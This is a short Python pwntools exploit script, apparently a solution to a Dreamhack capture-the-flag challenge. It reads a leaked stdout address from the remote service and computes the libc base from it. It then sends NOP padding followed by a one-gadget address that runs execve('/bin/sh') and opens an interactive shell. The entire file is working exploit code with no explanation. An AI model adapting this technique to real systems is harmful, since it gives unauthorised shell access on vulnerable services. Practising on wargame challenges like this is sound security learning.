#!/usr/bin/env python2

from pwn import *
import re

HOST = "host1.dreamhack.games"
PORT = 22539

libc = ELF("./libc.so.6")

libc_og_off = 0x45216 #execve("/bin/sh", rsp+0x30, environ)

conn = remote(HOST, PORT)

stdout = int(re.search("0[xX][0-9a-fA-F]+",conn.recv()).group(), 16)
libc_addr = stdout - 0x3C5620
libc_og = libc_addr + libc_og_off

print("libc one gadget: {}".format(hex(libc_og)))

payload = asm("nop") * 0x18
payload += p64(0) * 0x02
payload += p64(libc_og)

conn.send(payload)
conn.interactive()
